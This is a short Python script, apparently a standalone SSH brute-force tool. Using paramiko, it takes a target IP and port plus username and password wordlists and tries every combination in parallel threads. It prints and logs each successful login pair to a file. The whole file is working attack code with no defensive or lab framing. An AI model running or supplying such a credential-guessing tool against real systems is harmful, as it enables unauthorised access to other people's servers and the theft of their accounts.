import paramiko
import time
import argparse
import logging
import threading



parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="Target IP address", required=True)
parser.add_argument("-p", "--port", help="Target port", required=True)
parser.add_argument("-u", "--usernames", help="Usernames file", required=True)
parser.add_argument("-w", "--passwords", help="Passwords file", required=True)
args = parser.parse_args()

logging.basicConfig(filename='ssh_brute_force.log', level=logging.INFO)



with open(args.usernames) as f:
    usernames = f.read().splitlines()

with open(args.passwords) as f:
    passwords = f.read().splitlines()


def try_login(username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(args.target, port=args.port, username=username, password=password)
        print(f"[+] Login Successful! {username}:{password}")
        logging.info(f"[+] Login Successful! {username}:{password}")
        ssh.close()
    except paramiko.ssh_exception.AuthenticationException:
        print(f"[-] Login Failed! {username}:{password}")
    except paramiko.ssh_exception.SSHException:
        pass

for username in usernames:
    for password in passwords:
        t = threading.Thread(target=try_login, args=(username,password))
        t.start()

